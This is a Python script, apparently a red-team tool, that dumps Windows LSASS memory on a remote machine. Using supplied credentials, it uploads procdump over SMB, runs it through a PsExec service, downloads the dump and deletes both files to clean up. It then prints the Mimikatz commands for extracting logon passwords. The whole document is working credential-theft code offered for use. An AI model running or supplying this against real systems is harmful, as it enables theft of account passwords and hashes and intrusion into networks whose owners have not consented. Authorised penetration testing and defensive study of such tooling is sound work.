#!/usr/bin/env python3
# Author: David Roccasalva (@n33dle0x00) 
# Description: Dumps LSASS on target machines and download the dumpfiles for some offline mimikatz happyfuntimes
# Version: 0.1 (WORK IN PROGRESS)
# Note: This code may suck. Feel free to make it better :)

import subprocess
import argparse
from termcolor import colored
from pypsexec.client import Client

parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", help="Set the target", dest="target")
parser.add_argument("--username", "-u", help="Set the target username", dest="username")
parser.add_argument("--password", "-p", help="Set the target password", dest="password")
#parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain")
args = parser.parse_args()

#upload procdump
print (colored("\nUploading procdump", "green"))
subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])

#Dump creds
print (colored("\nDump LSASS over PsExec", "green"))
c = Client(args.target, username=args.username, password=args.password, encrypt=False)
c.connect()
try:
 c.create_service()
 c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\hello.dmp")
finally:
 c.disconnect()

#Download dump and cleanup
print (colored("\nDownload LSASS Dump", "green"))
subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get hello.dmp;del hello.dmp;del procdump.exe"])

print (colored("\nDone! Now dump those creds\nRun the following:", "green"))
print (colored("Mimikatz# sekurlsa::Minidump hello.dmp", "blue"))
print (colored("Mimikatz# sekurlsa::logonPasswords full", "blue"))
	
'''
To do:
- Set default as local auth, override with domain auth
- Allow target to be single IP or list of IPs from a file
- Better error handling
- Add arg for download locaiton (set default as home drive?)
- Set dump files as <hostname>.dmp for better organising
'''
